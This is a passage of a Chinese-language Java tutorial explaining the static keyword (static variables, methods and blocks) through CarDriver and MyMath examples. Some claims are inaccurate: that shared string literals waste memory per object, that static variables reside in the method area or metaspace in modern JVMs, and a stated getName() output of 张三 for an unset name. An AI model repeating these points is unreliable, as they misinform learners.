ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、先抛出核心问题：为什么需要 <code>static</code> 关键字？</h2>
<p>我们先看 <strong>汽车司机类 <code>CarDriver</code></strong> 的例子：</p>
<p>运行</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CarDriver</span> {
    <span class="hljs-comment">// 成员变量：每个司机对象 独有 的属性</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> name; <span class="hljs-comment">// 每个司机姓名不同</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;     <span class="hljs-comment">// 每个司机年龄不同</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> license; <span class="hljs-comment">// 每个司机驾照号不同</span>
    
    <span class="hljs-comment">// 思考：所有司机都有一个共同的属性 → 职业名称都是「司机」，这个属性值 所有对象都一样</span>
    <span class="hljs-comment">// 如果写成成员变量：private String job = "司机";</span>
    <span class="hljs-comment">// 问题：创建100个司机对象，堆内存中就会存100个"司机"字符串，完全重复，极度浪费内存！</span>
}
</code></pre>
<p>👉 <strong>核心痛点</strong>：当一个属性 / 方法，是<strong>属于【类本身】的、所有对象共享的、值完全相同的</strong>，如果定义成普通的成员变量 / 方法，会在每个对象中都存一份，<strong>造成巨大的内存浪费</strong>。</p>
<p>而 <code>static</code> 关键字就是为了解决这个问题而生的：</p>
<blockquote>
<p><strong>static 的核心作用</strong>：把「成员变量 / 方法」从【对象级】提升为【类级】，成为<strong>类的共有资源</strong>，所有对象共享同一份数据，内存中<strong>只存一份</strong>，极大节省内存。</p>
</blockquote>
<hr/>
<h2 data-id="heading-1">二、核心铺垫：复习 Java 的三大核心内存区域（<code>static</code>专属内存必看）</h2>
<p>理解<code>static</code>的内存分配，只需要牢记这三块内存，<strong>和上一篇字符串的内存完全一致，只是补充了 static 的专属区域</strong>，先复习巩固，重中之重：</p>
<h3 data-id="heading-2">✅ 1. 堆内存（Heap）</h3>
<ul>
<li>存储内容：<strong>所有通过<code>new</code>关键字创建的【对象本身】</strong> （比如<code>new CarDriver()</code>、<code>new MyMath()</code>、<code>new StringBuilder()</code>）、对象的<strong>成员变量</strong>（非 static 的变量，比如 name、age）；</li>
<li>核心特点：<strong>一个对象一份内存</strong>，不同对象的成员变量相互独立，互不影响。</li>
</ul>
<h3 data-id="heading-3">✅ 2. 方法区（Method Area，JDK8 叫【元空间】）【<code>static</code>的专属内存，核心核心】</h3>
<ul>
<li>存储内容：① 类的<strong>字节码信息</strong>（类的结构、方法定义、变量定义，只要类被加载，就会存到这里）；② <strong>所有被 static 修饰的内容</strong> → 静态变量、静态方法、静态代码块；③ 字符串常量池（上一篇学的，String 的字面量）；</li>
<li>核心特点：① JVM 启动时就加载，<strong>内存中永远只有一份</strong>，不会随对象的创建而创建，也不会随对象的销毁而销毁；② 只要类存在，static 的内容就存在，<strong>所有对象共享同一份 static 数据</strong>；③ 生命周期：<strong>和类的生命周期一致</strong>（类加载时初始化，程序结束时销毁）。</li>
</ul>
<h3 data-id="heading-4">✅ 3. 栈内存（Stack）</h3>
<ul>
<li>存储内容：方法的局部变量、方法的调用栈、对象的引用（变量名）；</li>
<li>核心特点：方法执行完，栈中的内容就会被销毁，速度最快。</li>
</ul>
<hr/>
<h2 data-id="heading-5">三、<code>static</code> 静态变量 核心讲解（重点中的重点）</h2>
<h3 data-id="heading-6">✅ 1. 什么是静态变量？定义格式</h3>
<h4 data-id="heading-7">✔ 概念</h4>
<p>被 <code>static</code> 关键字修饰的<strong>成员变量</strong>，称为「静态变量」，也叫「类变量」。与之对应的是：<strong>非 static 的成员变量</strong> → 叫「实例变量 / 对象变量」（你之前写的 name、age 都是）。</p>
<h4 data-id="heading-8">✔ 定义格式（写在类中，方法外）</h4>
<p>java</p>
<p>运行</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> 类名 {
    <span class="hljs-comment">// 1. 静态变量：加static修饰，推荐加访问修饰符</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> 数据类型 变量名 = 初始值;
    
    <span class="hljs-comment">// 2. 实例变量：不加static，你的代码里全是这种</span>
    <span class="hljs-keyword">public</span> 数据类型 变量名 = 初始值;
}
</code></pre>
<h4 data-id="heading-9">✔ 你的代码改造示例（CarDriver 类，最贴合你的场景）</h4>
<p>java</p>
<p>运行</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CarDriver</span> {
    <span class="hljs-comment">// ✅ 实例变量：每个对象 独有，堆内存中每个对象存一份</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> name;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> license;
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> carNum;
    
    <span class="hljs-comment">// ✅ 静态变量：所有司机对象 共享，方法区中只存一份，值完全相同</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">String</span> job = <span class="hljs-string">"汽车司机"</span>; <span class="hljs-comment">// 所有司机的职业都是这个，不用每个对象存一份</span>
    
    <span class="hljs-comment">// get/set方法、toString方法省略</span>
}
</code></pre>
<h3 data-id="heading-10">✅ 2. 静态变量的【内存分配规则】（核心！必背！内存图 + 文字详解）</h3>
<p>这是<code>static</code>最核心的知识点，也是面试必考的内容，我们用上面的<code>CarDriver</code>类举例子，执行如下代码，看内存分配的完整过程：</p>
<p>java</p>
<p>运行</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
    <span class="hljs-comment">// 创建第一个司机对象</span>
    <span class="hljs-type">CarDriver</span> <span class="hljs-variable">driver1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CarDriver</span>();
    driver1.setName(<span class="hljs-string">"张三"</span>);
    driver1.setAge(<span class="hljs-number">30</span>);
    
    <span class="hljs-comment">// 创建第二个司机对象</span>
    <span class="hljs-type">CarDriver</span> <span class="hljs-variable">driver2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CarDriver</span>();
    driver2.setName(<span class="hljs-string">"李四"</span>);
    driver2.setAge(<span class="hljs-number">28</span>);
}
</code></pre>
<h4 data-id="heading-11">✔ 完整内存分配步骤（按执行顺序，一步步看，看懂这个 = 懂了 static 内存）</h4>
<h5 data-id="heading-12">步骤 1：类加载 → 方法区中初始化 <code>static静态变量</code></h5>
<p>当 JVM 执行到<code>CarDriver</code>类时，会先把类的字节码加载到<strong>方法区</strong>，同时：</p>
<ul>
<li>在方法区中，为静态变量 <code>job</code> 分配内存，赋值为 <code>"汽车司机"</code>；</li>
<li>✅ 关键：<strong>此时还没有创建任何对象，静态变量就已经存在了，内存中只存一份</strong>。</li>
</ul>
<h5 data-id="heading-13">步骤 2：创建对象 → 堆内存中初始化 <code>实例变量</code></h5>
<p>执行<code>new CarDriver()</code>时，JVM 在<strong>堆内存</strong>中创建一个司机对象：</p>
<ul>
<li>为实例变量 <code>name、age、license、carNum</code> 分配内存（默认值：String=null，int=0）；</li>
<li>通过 set 方法赋值后，堆中对象的成员变量有了具体值；</li>
<li>✅ 关键：<strong>堆中的对象，不会存储静态变量！静态变量只在方法区存一份</strong>。</li>
</ul>
<h5 data-id="heading-14">步骤 3：创建第二个对象 → 堆内存新增对象，静态变量依然只有一份</h5>
<p>执行第二个<code>new CarDriver()</code>时：</p>
<ul>
<li>堆内存中<strong>新增一个独立的对象</strong>，有自己的 name、age 等实例变量；</li>
<li>方法区中的静态变量<code>job</code>，<strong>没有任何变化，还是原来的那一份</strong>；</li>
</ul>
<h4 data-id="heading-15">✔ 核心内存结论（一句话总结，刻进脑子里）</h4>
<blockquote>
<p>**静态变量 → 存在【方法区】，内存中永远只存一份，属于类本身，所有对象共享；**<strong>实例变量 → 存在【堆内存】，每个对象存一份，属于对象本身，对象之间互不影响。</strong></p>
</blockquote>
<h4 data-id="heading-16">✔ 直观内存图（文字版，好理解）</h4>
<p>plaintext</p>
<pre><code class="hljs language-ini" lang="ini">【栈内存】：
  driver1 → 指向 堆内存的对象1
  driver2 → 指向 堆内存的对象2

【堆内存】：
  对象1：<span class="hljs-attr">name</span>=张三, age=<span class="hljs-number">30</span>, license=null, carNum=null （无静态变量）
  对象2：<span class="hljs-attr">name</span>=李四, age=<span class="hljs-number">28</span>, license=null, carNum=null （无静态变量）

【方法区】：
  CarDriver类的字节码信息
  静态变量：<span class="hljs-attr">job</span> = <span class="hljs-string">"汽车司机"</span>  → 所有对象共享这一份！
</code></pre>
<hr/>
<h2 data-id="heading-17">四、静态变量 vs 实例变量 核心区别（必背！必考！最全对比表）</h2>
<p>这是<code>static</code>的<strong>核心考点</strong>，也是你写代码时判断是否用 static 的唯一依据，<strong>所有区别都源于内存分配的不同</strong>，整理成你最容易记的对比表，优先级⭐越多越重要：</p>























































<table><thead><tr><th>对比维度</th><th>静态变量（类变量）<code>static</code></th><th>实例变量（对象变量）无 static</th></tr></thead><tbody><tr><td><strong>所属者</strong></td><td>✅ 属于【类本身】</td><td>✅ 属于【对象本身】</td></tr><tr><td><strong>内存位置</strong></td><td>✅ 方法区（元空间）</td><td>✅ 堆内存</td></tr><tr><td><strong>内存份数</strong></td><td>✅ 内存中<strong>永远只存 1 份</strong></td><td>✅ 每个对象存<strong>1 份</strong>，创建 n 个对象存 n 份</td></tr><tr><td><strong>初始化时机</strong></td><td>✅ 类加载时就初始化（早）</td><td>✅ 创建对象时才初始化（晚）</td></tr><tr><td><strong>生命周期</strong></td><td>✅ 和类的生命周期一致（程序结束销毁）</td><td>✅ 和对象的生命周期一致（对象被 GC 回收就销毁）</td></tr><tr><td><strong>调用方式</strong></td><td>✅ 两种方式：① 类名。静态变量 （推荐，规范）② 对象名。静态变量 （语法允许，不推荐）</td><td>✅ 只有 1 种方式：对象名。实例变量 （必须创建对象才能调用）</td></tr><tr><td><strong>核心特点</strong></td><td>✅ 所有对象<strong>共享同一份数据</strong>，一处修改，处处生效</td><td>✅ 每个对象<strong>独有数据</strong>，修改一个对象的变量，其他对象不受影响</td></tr><tr><td><strong>使用场景</strong></td><td>✅ 所有对象<strong>共用不变的值</strong>（比如职业、常量）✅ 统计对象的个数（比如统计创建了多少个司机）</td><td>✅ 每个对象<strong>独有的属性</strong>（比如姓名、年龄、驾照号）</td></tr><tr><td><strong>优先级⭐</strong></td><td>⭐⭐⭐⭐⭐</td><td>⭐⭐⭐⭐⭐</td></tr></tbody></table>
<h3 data-id="heading-18">✅ 调用方式代码示例（你的 CarDriver 类）</h3>
<p>java</p>
<p>运行</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span>(<span class="hljs-params">String[] args</span>)</span> {
    <span class="hljs-comment">// ===== 1. 静态变量的调用：推荐用【类名.变量名】，无需创建对象！</span>
    System.<span class="hljs-keyword">out</span>.println(CarDriver.job); <span class="hljs-comment">// 输出：汽车司机 ✔️ 推荐写法</span>
    
    <span class="hljs-comment">// 静态变量也可以用对象调用（语法允许，但不推荐，可读性差）</span>
    CarDriver driver = <span class="hljs-keyword">new</span> CarDriver();
    System.<span class="hljs-keyword">out</span>.println(driver.job); <span class="hljs-comment">// 输出：汽车司机 ✔️ 不推荐</span>
    
    <span class="hljs-comment">// ===== 2. 实例变量的调用：必须创建对象，用对象调用</span>
    System.<span class="hljs-keyword">out</span>.println(driver.getName()); <span class="hljs-comment">// 输出：张三 ✔️ 唯一写法</span>
    <span class="hljs-comment">// System.out.println(CarDriver.name); // 报错 ❌ 类名不能调用实例变量</span>
    
    <span class="hljs-comment">// ===== 3. 静态变量的核心特性：一处修改，处处生效</span>
    CarDriver.job = <span class="hljs-string">"职业司机"</span>; <span class="hljs-comment">// 修改类的静态变量</span>
    System.<span class="hljs-keyword">out</span>.println(CarDriver.job); <span class="hljs-comment">// 输出：职业司机</span>
    System.<span class="hljs-keyword">out</span>.println(driver.job);    <span class="hljs-comment">// 输出：职业司机 → 所有对象都看到修改后的值</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-19">五、<code>static</code> 静态方法 核心讲解（你写的 MyMath 类完美适配）</h2>
<p>讲完静态变量，必须讲静态方法，这是你<strong>作业中最常用的 static 场景</strong>（比如你写的<code>MyMath</code>类中的<code>add()</code>、<code>compare()</code>方法，就应该用 static 修饰），两者是配套使用的。</p>
<h3 data-id="heading-20">✅ 1. 什么是静态方法？定义格式</h3>
<p>被 <code>static</code> 关键字修饰的<strong>成员方法</strong>，称为「静态方法」，也叫「类方法」。</p>
<p>java</p>
<p>运行</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> 类名 {
    <span class="hljs-comment">// 静态方法：加static修饰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> 返回值类型 方法名(参数列表) {
        方法体;
    }
    
    <span class="hljs-comment">// 实例方法：不加static（你之前写的所有方法都是）</span>
    <span class="hljs-keyword">public</span> 返回值类型 方法名(参数列表) {
        方法体;
    }
}
</code></pre>
<h3 data-id="heading-21">✅ 2. 静态方法的核心特点（和静态变量一脉相承）</h3>
<h4 data-id="heading-22">✔ 核心特性①：静态方法属于【类本身】，存在方法区，内存中只存一份</h4>
<h4 data-id="heading-23">✔ 核心特性②：调用方式（和静态变量完全一样）</h4>
<ul>
<li>推荐：<code>类名.静态方法名(参数)</code> → 无需创建对象，直接调用（最方便！）</li>
<li>不推荐：<code>对象名.静态方法名(参数)</code> → 语法允许，可读性差</li>
</ul>
<h4 data-id="heading-24">✔ 你的代码改造：MyMath 类（最经典的静态方法场景，必改！）</h4>
<p>你之前写的<code>MyMath</code>类，是做「通用的数学计算」，不需要创建对象，所有方法都应该用<code>static</code>修饰，这样调用时<strong>不用 new 对象</strong>，代码简洁到极致！</p>
<p>java</p>
<p>运行</p>
<pre><code class="hljs language-arduino" lang="arduino">package com.shehuiuniversity;
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyMath</span> {
    <span class="hljs-comment">// ✅ 静态方法：加法计算，通用工具方法，无需创建对象</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> </span>{
        System.out.<span class="hljs-built_in">println</span>(a + <span class="hljs-string">" + "</span> + b + <span class="hljs-string">" = "</span> + (a+b));
    }
    
    <span class="hljs-comment">// ✅ 静态方法：找三个数的最大值，通用工具方法</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">compare</span><span class="hljs-params">(<span class="hljs-type">double</span> a, <span class="hljs-type">double</span> b, <span class="hljs-type">double</span> c)</span> </span>{
        <span class="hljs-type">double</span>[] arr = {a,b,c};
        <span class="hljs-type">double</span> max = arr[<span class="hljs-number">0</span>];
        <span class="hljs-keyword">for</span> (<span class="hljs-type">double</span> num : arr) {
            <span class="hljs-keyword">if</span>(num &gt; max) max = num;
        }
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"最大值为："</span> + max);
    }
}
</code></pre>
<h4 data-id="heading-25">✔ 测试类调用（对比你之前的写法，简化太多！）</h4>
<p>java</p>
<p>运行</p>
<pre><code class="hljs language-typescript" lang="typescript">package com.<span class="hljs-property">Testclass</span>;
<span class="hljs-keyword">import</span> com.<span class="hljs-property">shehuiuniversity</span>.<span class="hljs-property">MyMath</span>;
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MathTest</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) {
        <span class="hljs-comment">// 之前的写法：需要new对象，再调用</span>
        <span class="hljs-comment">// MyMath math = new MyMath();</span>
        <span class="hljs-comment">// math.add(10,20);</span>
        <span class="hljs-comment">// math.compare(0.1,0.5,0.3);</span>
        
        <span class="hljs-comment">// ✅ 静态方法的写法：直接类名调用，无需new对象，超级简洁！</span>
        <span class="hljs-title class_">MyMath</span>.<span class="hljs-title function_">add</span>(<span class="hljs-number">10</span>,<span class="hljs-number">20</span>); <span class="hljs-comment">// 输出：10+20=30</span>
        <span class="hljs-title class_">MyMath</span>.<span class="hljs-title function_">compare</span>(<span class="hljs-number">0.1</span>,<span class="hljs-number">0.5</span>,<span class="hljs-number">0.3</span>); <span class="hljs-comment">// 输出：最大值为0.5</span>
    }
}
</code></pre>
<p>👉 <strong>为什么 MyMath 类要用静态方法？<strong>因为<code>add()</code>和<code>compare()</code>是</strong>通用的工具方法</strong>，不依赖任何对象的属性，只是做计算，这种方法用 static 修饰，调用时不需要创建对象，是 Java 开发的标准写法（比如 Java 内置的<code>Math.random()</code>、<code>Math.max()</code>都是静态方法）。</p>
<h3 data-id="heading-26">✅ 3. 静态方法的【核心规则：能做什么，不能做什么】（高频坑点！必背！）</h3>
<p>这是<code>static</code>最容易出错的考点，也是新手写代码最容易报错的地方，<strong>所有规则的根源：静态方法加载时，对象还没创建！</strong></p>
<h4 data-id="heading-27">✔ ✅ 静态方法中 可以直接调用的内容：</h4>
<ol>
<li>静态变量（因为静态变量和静态方法一起加载到方法区）；</li>
<li>其他静态方法（同理）；</li>
</ol>
<h4 data-id="heading-28">✔ ❌ 静态方法中 绝对不能直接调用的内容（编译报错！）：</h4>
<ol>
<li><strong>实例变量</strong>（非 static 的变量）→ 因为实例变量属于对象，静态方法加载时，对象还没创建，内存中没有实例变量；</li>
<li><strong>实例方法</strong>（非 static 的方法）→ 因为实例方法依赖对象，静态方法加载时，对象还没创建；</li>
</ol>
<h4 data-id="heading-29">✔ 补充规则：</h4>
<p>静态方法中<strong>可以间接调用</strong>实例变量 / 方法 → 必须<strong>手动创建对象</strong>，通过对象调用即可。</p>
<h4 data-id="heading-30">✔ 规则代码示例（一目了然）</h4>
<p>java</p>
<p>运行</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">TestStatic</span> {
    <span class="hljs-comment">// 静态变量</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String strStatic = <span class="hljs-string">"静态变量"</span>;
    <span class="hljs-comment">// 实例变量</span>
    <span class="hljs-keyword">public</span> String strInstance = <span class="hljs-string">"实例变量"</span>;
    
    <span class="hljs-comment">// 静态方法</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">staticMethod</span>()</span> {
        System.<span class="hljs-keyword">out</span>.println(strStatic); <span class="hljs-comment">// ✅ 静态方法调用静态变量：允许</span>
        staticMethod2(); <span class="hljs-comment">// ✅ 静态方法调用静态方法：允许</span>
        
        <span class="hljs-comment">// System.out.println(strInstance); // ❌ 静态方法调用实例变量：报错！</span>
        <span class="hljs-comment">// instanceMethod(); // ❌ 静态方法调用实例方法：报错！</span>
        
        <span class="hljs-comment">// ✅ 间接调用实例变量/方法：创建对象后调用</span>
        TestStatic ts = <span class="hljs-keyword">new</span> TestStatic();
        System.<span class="hljs-keyword">out</span>.println(ts.strInstance); <span class="hljs-comment">// 允许</span>
        ts.instanceMethod(); <span class="hljs-comment">// 允许</span>
    }
    
    <span class="hljs-comment">// 静态方法2</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">staticMethod2</span>()</span> {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"静态方法2"</span>);
    }
    
    <span class="hljs-comment">// 实例方法</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">instanceMethod</span>()</span> {
        <span class="hljs-comment">// ✅ 实例方法可以调用任何内容：静态的+实例的（无任何限制）</span>
        System.<span class="hljs-keyword">out</span>.println(strStatic);
        System.<span class="hljs-keyword">out</span>.println(strInstance);
        staticMethod();
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-31">六、<code>static</code> 静态代码块 核心讲解（补充知识点，作业 / 面试常用）</h2>
<p>除了静态变量、静态方法，还有一个<code>static</code>的常用语法：<strong>静态代码块</strong>，也是面试高频考点，顺带讲完，内容完整。</p>
<h3 data-id="heading-32">✅ 1. 定义格式</h3>
<p>写在类中，方法外，被<code>static</code>修饰的代码块，没有方法名，没有参数，没有返回值：</p>
<p>java</p>
<p>运行</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> 类名 {
    <span class="hljs-comment">// 静态代码块</span>
    <span class="hljs-type">static</span> {
        代码体; <span class="hljs-comment">// 初始化静态变量、执行类的初始化逻辑</span>
    }
}
</code></pre>
<h3 data-id="heading-33">✅ 2. 核心特点</h3>
<ol>
<li>执行时机：<strong>类加载时自动执行，且只执行一次</strong>（不管创建多少个对象，静态代码块只执行一次）；</li>
<li>执行顺序：静态代码块 → 构造方法（静态代码块更早）；</li>
<li>作用：专门用于<strong>初始化静态变量</strong>，或者执行一些需要在类加载时就完成的初始化逻辑；</li>
</ol>
<h3 data-id="heading-34">✅ 3. 代码示例（你的 CarDriver 类适配）</h3>
<p>java</p>
<p>运行</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">CarDriver</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String job;
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">int</span> age;
    
    <span class="hljs-comment">// 静态代码块：初始化静态变量，类加载时执行，只执行一次</span>
    <span class="hljs-keyword">static</span> {
        job = <span class="hljs-string">"汽车司机"</span>;
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"静态代码块执行了 → 初始化职业为司机"</span>);
    }
    
    <span class="hljs-comment">// 构造方法：创建对象时执行，创建一次执行一次</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">CarDriver</span>()</span> {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"构造方法执行了 → 创建司机对象"</span>);
    }
}
</code></pre>
<p>调用测试：</p>
<p>java</p>
<p>运行</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
    <span class="hljs-type">CarDriver</span> <span class="hljs-variable">driver1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CarDriver</span>();
    <span class="hljs-type">CarDriver</span> <span class="hljs-variable">driver2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CarDriver</span>();
}
</code></pre>
<p>执行结果：</p>
<p>plaintext</p>
<pre><code class="hljs">静态代码块执行了 → 初始化职业为司机
构造方法执行了 → 创建司机对象
构造方法执行了 → 创建司机对象
</code></pre>
<p>👉 结论：静态代码块只执行一次，构造方法创建几个对象执行几次。</p>
<hr/>
<h2 data-id="heading-35">七、<code>static</code> 的核心使用场景（总结，学完就会用，不踩坑）</h2>
<p>结合你写的所有代码（CarDriver、MyMath、字符串工具类），整理出<code>static</code>的<strong>3 个最常用场景</strong>，也是开发中的标准用法，<strong>按优先级排序，你作业中用到的场景都在里面</strong>：</p>
<h3 data-id="heading-36">✅ 场景 1：定义【通用工具类的方法】→ 必用 static（你的 MyMath 类）</h3>
<p>比如：数学计算（add、compare）、字符串工具（拼接、判断）、数组工具（排序、找最值），这类方法是通用的，不依赖任何对象的属性，用 static 修饰后，调用时无需创建对象，直接类名调用，代码简洁高效。</p>
<blockquote>
<p>Java 内置的工具类都是这样写的：<code>java.lang.Math</code>、<code>java.util.Arrays</code>、<code>java.util.Collections</code> 中的所有方法都是静态方法。</p>
</blockquote>
<h3 data-id="heading-37">✅ 场景 2：定义【所有对象共享的常量 / 属性】→ 必用 static（你的 CarDriver 类）</h3>
<p>比如：所有司机的职业、所有学生的学校名称、所有商品的品牌，这类属性值所有对象都一样，用 static 修饰后，内存中只存一份，极大节省内存。</p>
<h3 data-id="heading-38">✅ 场景 3：定义【统计类的全局数据】→ 必用 static</h3>
<p>比如：统计创建了多少个司机对象、统计程序的运行次数、统计用户的登录次数，这类数据需要全局共享，用 static 变量存储，一处修改，处处生效。</p>
<hr/>
<h2 data-id="heading-39">八、<code>static</code> 的高频坑点（避坑指南，新手必看）</h2>
<h3 data-id="heading-40">✅ 坑 1：滥用 static，把所有变量 / 方法都加 static</h3>
<p>比如：把司机的 name、age 也加 static，结果所有司机的姓名和年龄都变成一样的，这是最常见的错误！</p>
<blockquote>
<p>✔ 原则：<strong>独有属性用实例变量，共享属性用静态变量</strong>。</p>
</blockquote>
<h3 data-id="heading-41">✅ 坑 2：静态方法中调用实例变量 / 方法，编译报错</h3>
<p>根源：静态方法加载时，对象还没创建，内存中没有实例变量，记住规则即可避免。</p>
<h3 data-id="heading-42">✅ 坑 3：用对象名调用静态变量 / 方法（语法允许，但不推荐）</h3>
<p>比如：<code>driver.job</code>、<code>math.add(10,20)</code>，虽然不报错，但可读性差，别人看代码时不知道这是静态的，<strong>标准写法永远是：类名。静态变量 / 方法</strong>。</p>
<h3 data-id="heading-43">✅ 坑 4：认为 static 的内容是「全局唯一」的，就可以随便修改</h3>
<p>静态变量是类的共有资源，一处修改，所有对象都会受影响，修改时要谨慎，避免误改导致程序逻辑错误。</p>
<hr/>
<h2 data-id="heading-44">九、最终总结（所有知识点精华，背下来 = 掌握所有 static 考点）</h2>
<h3 data-id="heading-45">✅ 核心一句话</h3>
<p><code>static</code>的本质是：<strong>把资源从【对象私有】变为【类公有】，内存中只存一份，所有对象共享，节省内存，简化调用</strong>。</p>
<h3 data-id="heading-46">✅ 核心记忆点</h3>
<ol>
<li><strong>静态变量</strong>：方法区、一份内存、类加载初始化、类名调用、所有对象共享；</li>
<li><strong>实例变量</strong>：堆内存、多份内存、对象创建初始化、对象名调用、对象独有；</li>
<li><strong>静态方法</strong>：类名调用、不能直接调用实例内容、适合做通用工具方法；</li>
<li><strong>静态代码块</strong>：类加载执行一次、初始化静态变量；</li>
<li><strong>使用原则</strong>：<strong>能不用 static 就不用，必须用的时候才用</strong> → 独有属性用实例，共享属性 / 工具方法用静态。</li>
</ol>
<hr/>
<h2 data-id="heading-47">十、附赠：你之前的 MyMath 类 + CarDriver 类 最终优化版（带 static，完美版本）</h2>
<h3 data-id="heading-48">✅ 优化后 MyMath 类（静态方法，推荐写法）</h3>
<p>java</p>
<p>运行</p>
<pre><code class="hljs language-arduino" lang="arduino">package com.shehuiuniversity;
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyMath</span> {
    <span class="hljs-comment">// 静态方法：加法</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> </span>{
        System.out.<span class="hljs-built_in">println</span>(a + <span class="hljs-string">" + "</span> + b + <span class="hljs-string">" = "</span> + (a+b));
    }
    <span class="hljs-comment">// 静态方法：找三个数最大值</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">compare</span><span class="hljs-params">(<span class="hljs-type">double</span> a, <span class="hljs-type">double</span> b, <span class="hljs-type">double</span> c)</span> </span>{
        <span class="hljs-type">double</span> max = a &gt; b ? (a &gt; c ? a : c) : (b &gt; c ? b : c);
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"参与比较的数值："</span> + a + <span class="hljs-string">","</span> + b + <span class="hljs-string">","</span> + c + <span class="hljs-string">"，最大值为："</span> + max);
    }
}
